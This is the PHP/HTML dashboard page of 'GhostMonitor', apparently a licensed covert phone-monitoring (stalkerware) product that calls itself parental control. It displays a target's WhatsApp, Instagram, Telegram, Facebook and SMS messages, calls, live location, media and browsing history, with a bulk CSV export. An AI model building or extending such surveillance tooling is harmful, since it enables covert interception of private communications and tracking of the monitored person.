<?php require 'config.php'; 
if(!isset($_SESSION['parent_email'])) { header('Location: login.php'); exit; }
$email = $_SESSION['parent_email'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostMonitor Dashboard</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
    <div class="sidebar-overlay" onclick="closeMobileMenu()"></div>

    <div class="sidebar" id="sidebar">
        <div class="logo">
            <div class="logo-icon"><i class="fas fa-ghost"></i></div>
            <div class="logo-text">
                GhostMonitor
                <small>Because trust is overrated 👻</small>
            </div>
        </div>
        <nav>
            <a href="#" data-section="overview" class="active"><i class="fas fa-chart-line"></i> Overview</a>
            <a href="#" data-section="whatsapp" data-app="whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a>
            <a href="#" data-section="instagram" data-app="instagram"><i class="fab fa-instagram"></i> Instagram</a>
            <a href="#" data-section="telegram" data-app="telegram"><i class="fab fa-telegram"></i> Telegram</a>
            <a href="#" data-section="facebook" data-app="facebook"><i class="fab fa-facebook"></i> Facebook</a>
            <a href="#" data-section="calls" data-app="calls"><i class="fas fa-phone"></i> Calls</a>
            <a href="#" data-section="sms" data-app="sms"><i class="fas fa-sms"></i> SMS</a>
            <a href="#" data-section="location" data-app="location"><i class="fas fa-map-marker-alt"></i> Location</a>
            <a href="#" data-section="media" data-app="media"><i class="fas fa-images"></i> Media</a>
            <a href="#" data-section="browsing" data-app="browsing"><i class="fas fa-globe"></i> Browsing</a>
            <a href="#" data-section="settings" data-app="settings"><i class="fas fa-cog"></i> Settings</a>
        </nav>
        <div class="sidebar-footer">
            <div class="license-info">
                <span><i class="fas fa-clock" style="margin-right:4px;opacity:0.5"></i><span id="days-remaining">-</span> days left</span>
                <button onclick="logout()" class="btn-logout" title="Logout"><i class="fas fa-sign-out-alt"></i></button>
            </div>
        </div>
    </div>

    <div class="main-content">
        <header>
            <button class="menu-toggle" id="menuToggle" title="Menu">
                <i class="fas fa-bars"></i>
            </button>
            <div class="header-right">
                <span>Welcome, <?php echo htmlspecialchars($email); ?></span>
                <div class="license-status" id="licenseStatus">Checking...</div>
            </div>
        </header>

        <div class="content-area">
            <!-- OVERVIEW SECTION -->
            <section id="overview" class="section active">
                <div class="stats-grid">
                    <div class="stat-card">
                        <i class="fas fa-clock"></i>
                        <div>
                            <h3 id="total-time">0h 0m</h3>
                            <p>Today Screen Time</p>
                        </div>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-comments"></i>
                        <div>
                            <h3 id="total-messages">0</h3>
                            <p>Total Messages</p>
                        </div>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-phone"></i>
                        <div>
                            <h3 id="total-calls">0</h3>
                            <p>Phone Calls</p>
                        </div>
                    </div>
                    <div class="stat-card">
                        <i class="fas fa-map-marker-alt"></i>
                        <div>
                            <h3 id="location-updates">0</h3>
                            <p>Location Updates</p>
                        </div>
                    </div>
                </div>
                <!-- Device status -->
                <div class="chart-card" style="margin-bottom:1.25rem">
                    <h4><i class="fas fa-mobile-alt"></i> Monitored Devices</h4>
                    <div id="device-status-list" style="margin-top:0.5rem">
                        <div class="loading-card" style="padding:0.75rem">Loading devices...</div>
                    </div>
                </div>
                <div class="charts-grid">
                    <div class="chart-card">
                        <h4><i class="fas fa-chart-pie"></i> App Usage Today</h4>
                        <canvas id="usageChart" width="400" height="200"></canvas>
                    </div>
                    <div class="chart-card">
                        <h4><i class="fas fa-chart-line"></i> Activity Timeline</h4>
                        <canvas id="timelineChart" width="400" height="200"></canvas>
                    </div>
                </div>
            </section>

            <!-- WHATSAPP SECTION -->
            <section id="whatsapp" class="section" data-app="whatsapp">
                <div class="section-header">
                    <h2><i class="fab fa-whatsapp"></i> WhatsApp Conversations</h2>
                    <div class="search-box">
                        <i class="fas fa-search"></i>
                        <input type="text" id="whatsapp-search" placeholder="Search contacts, messages...">
                    </div>
                </div>
                <div class="contacts-list" id="whatsapp-contacts">
                    <div class="loading-card">Loading conversations...</div>
                </div>
            </section>

            <!-- INSTAGRAM SECTION -->
            <section id="instagram" class="section" data-app="instagram">
                <div class="section-header">
                    <h2><i class="fab fa-instagram"></i> Instagram DMs</h2>
                    <div class="search-box">
                        <i class="fas fa-search"></i>
                        <input type="text" id="instagram-search" placeholder="Search Instagram accounts...">
                    </div>
                </div>
                <div class="contacts-list" id="instagram-contacts">
                    <div class="loading-card">Loading Instagram data...</div>
                </div>
            </section>

            <!-- TELEGRAM SECTION -->
            <section id="telegram" class="section" data-app="telegram">
                <div class="section-header">
                    <h2><i class="fab fa-telegram"></i> Telegram Chats</h2>
                    <div class="search-box">
                        <i class="fas fa-search"></i>
                        <input type="text" id="telegram-search" placeholder="Search Telegram contacts...">
                    </div>
                </div>
                <div class="contacts-list" id="telegram-contacts">
                    <div class="loading-card">Loading Telegram data...</div>
                </div>
            </section>

            <!-- FACEBOOK SECTION -->
            <section id="facebook" class="section" data-app="facebook">
                <div class="section-header">
                    <h2><i class="fab fa-facebook"></i> Facebook Messenger</h2>
                    <div class="search-box">
                        <i class="fas fa-search"></i>
                        <input type="text" id="facebook-search" placeholder="Search Facebook friends...">
                    </div>
                </div>
                <div class="contacts-list" id="facebook-contacts">
                    <div class="loading-card">Loading Facebook data...</div>
                </div>
            </section>

            <!-- CALLS SECTION -->
            <section id="calls" class="section" data-app="calls">
                <div class="section-header">
                    <h2><i class="fas fa-phone"></i> Call History</h2>
                    <div class="date-range">
                        <input type="date" id="calls-start">
                        <input type="date" id="calls-end">
                        <button onclick="loadCalls()"><i class="fas fa-search"></i> Search</button>
                    </div>
                </div>
                <div id="calls-list" class="contacts-list">
                    <div class="loading-card">Loading call logs...</div>
                </div>
            </section>

            <!-- SMS SECTION -->
            <section id="sms" class="section" data-app="sms">
                <div class="section-header">
                    <h2><i class="fas fa-sms"></i> SMS Messages</h2>
                    <div class="search-box">
                        <i class="fas fa-search"></i>
                        <input type="text" id="sms-search" placeholder="Search SMS contacts...">
                    </div>
                </div>
                <div class="contacts-list" id="sms-contacts">
                    <div class="loading-card">Loading SMS data...</div>
                </div>
            </section>

            <!-- LOCATION SECTION -->
            <section id="location" class="section" data-app="location">
                <div class="section-header">
                    <h2><i class="fas fa-map-marker-alt"></i> Real-time Location</h2>
                    <div class="date-range">
                        <input type="datetime-local" id="location-start">
                        <input type="datetime-local" id="location-end">
                        <button onclick="filterLocations()"><i class="fas fa-search"></i> Filter</button>
                    </div>
                </div>
                <div id="map" style="height: 500px;"></div>
                <div id="location-timeline" style="margin-top: 1rem;"></div>
            </section>

            <!-- MEDIA SECTION -->
            <section id="media" class="section" data-app="media">
                <div class="section-header">
                    <h2><i class="fas fa-images"></i> Photos & Videos</h2>
                    <div class="search-box">
                        <i class="fas fa-search"></i>
                        <input type="text" id="media-search" placeholder="Search media...">
                    </div>
                </div>
                <div class="media-grid" id="media-grid">
                    <div class="loading-card">Loading media...</div>
                </div>
            </section>

            <!-- BROWSING SECTION -->
            <section id="browsing" class="section" data-app="browsing">
                <div class="section-header">
                    <h2><i class="fas fa-globe"></i> Browsing History</h2>
                    <div class="date-range">
                        <select id="browsing-filter">
                            <option value="today">Today</option>
                            <option value="week">This Week</option>
                            <option value="month">This Month</option>
                        </select>
                    </div>
                </div>
                <div id="browsing-history" class="contacts-list">
                    <div class="loading-card">Loading browsing data...</div>
                </div>
            </section>

            <!-- SETTINGS SECTION -->
            <section id="settings" class="section" data-app="settings">
                <div class="settings-grid">
                    <div class="setting-item">
                        <label><i class="fas fa-download"></i> Export All Data</label>
                        <button class="btn-primary" onclick="downloadAllData()">
                            <i class="fas fa-file-csv"></i> Download CSV
                        </button>
                    </div>
                    <div class="setting-item">
                        <label><i class="fas fa-shield-alt"></i> License Status</label>
                        <div style="font-size: 1rem; font-weight: 600; font-family: 'Syne', sans-serif;" id="license-details">Loading...</div>
                    </div>
                    <div class="setting-item">
                        <label><i class="fas fa-bell"></i> Notifications</label>
                        <div class="toggle-switch">
                            <input type="checkbox" id="notifications" checked>
                            <label for="notifications"></label>
                        </div>
                    </div>
                    <div class="setting-item full-width">
                        <label><i class="fas fa-sign-out-alt"></i> Logout</label>
                        <button class="btn-danger" onclick="logout()">Sign Out</button>
                    </div>
                </div>
            </section>
        </div>
    </div>

    <script src="assets/js/main.js"></script>
    <script src="assets/js/charts.js"></script>
    <script src="assets/js/map.js"></script>
</body>
</html>
